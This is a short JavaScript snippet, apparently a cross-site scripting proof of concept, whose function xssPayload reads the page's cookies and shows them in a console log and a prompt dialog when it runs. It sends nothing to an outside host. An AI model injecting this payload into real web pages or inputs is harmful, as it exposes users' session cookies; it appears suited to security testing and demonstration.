function xssPayload() {
  const alertMsg = 'xss ' + document.cookie;
  console.log(alertMsg);
  window.prompt(alertMsg);
}

xssPayload();
